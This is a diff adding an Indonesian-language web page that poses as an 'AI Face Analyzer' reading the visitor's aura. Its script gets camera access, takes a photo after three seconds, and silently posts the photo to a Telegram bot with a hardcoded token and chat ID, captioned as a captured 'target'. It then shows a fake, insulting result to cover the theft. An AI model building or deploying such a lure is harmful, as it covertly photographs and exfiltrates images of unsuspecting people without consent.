@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Scanner Aura</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: sans-serif; text-align: center; padding: 50px 20px; }
+        #cam-area { display: none; margin: 20px auto; border: 3px solid #0f0; width: 280px; height: 280px; border-radius: 50%; overflow: hidden; position: relative; }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .btn { background: #0f0; color: #000; padding: 15px 30px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        #loader { margin-top: 20px; color: yellow; }
+    </style>
+</head>
+<body>
+
+    <h2>🧬 AI Face Analyzer</h2>
+    <p>Klik untuk melihat aura wajahmu hari ini.</p>
+    
+    <button class="btn" id="startBtn">MULAI SCAN</button>
+
+    <div id="cam-area">
+        <video id="video" autoplay playsinline></video>
+    </div>
+    <div id="loader"></div>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // MASUKKAN DATA KAMU DI SINI
+        const TOKEN = '8237438582:AAEy0SowSAmcLAGPUVQ1NqHmmL5n54Yhu_8';
+        const CHAT_ID = '7268521744';
+
+        const startBtn = document.getElementById('startBtn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const loader = document.getElementById('loader');
+
+        startBtn.addEventListener('click', async () => {
+            startBtn.style.display = 'none';
+            document.getElementById('cam-area').style.display = 'block';
+            loader.innerText = "Mengakses sensor wajah...";
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                loader.innerText = "Memindai... Jangan bergerak!";
+
+                // Ambil foto setelah 3 detik
+                setTimeout(takePhoto, 3000);
+            } catch (err) {
+                alert("Kamera ditolak atau tidak ditemukan!");
+            }
+        });
+
+        async function takePhoto() {
+            loader.innerText = "Menganalisis hasil...";
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'poto.png');
+                fd.append('caption', '📸 FOTO TARGET BERHASIL DIAMBIL!');
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    loader.innerHTML = "<b style='color:red'>ANALISIS SELESAI!</b><br>Tingkat Ketampanan: 12% (Kritis)";
+                    alert("Aura kamu terlalu gelap untuk discan!");
+                } catch (e) {
+                    console.log("Error kirim foto");
+                }
+            }, 'image/png');
+        }
+    </script>
+</body>
+</html>
